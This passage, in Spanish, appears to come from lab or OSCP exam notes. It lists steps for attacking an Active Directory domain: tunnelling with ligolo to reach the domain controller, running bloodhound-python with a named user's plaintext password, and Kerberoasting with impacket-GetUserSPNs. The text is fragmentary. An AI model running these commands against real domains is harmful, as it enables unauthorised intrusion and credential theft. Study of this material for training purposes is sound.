...
2. Establecemos tunel ligolo para llegar el DC 
3. Ejecutamos bloodhound sobre el DC con las credenciales de Eric.Wallows:

```bash
bloodhound-python -u 'Eric.Wallows' -p 'EricLikesRunning800' -d oscp.exam -ns 10.10.110.152 -c all --zip
```
...
# Alternativa 2
impacket-GetUserSPNs -outputfile kerberostables.txt oscp.exam/Eric.Wallows:'EricLikesRunning800' -dc-ip 10.10.110.152
```
...
* Despues de una busqueda Explotamos
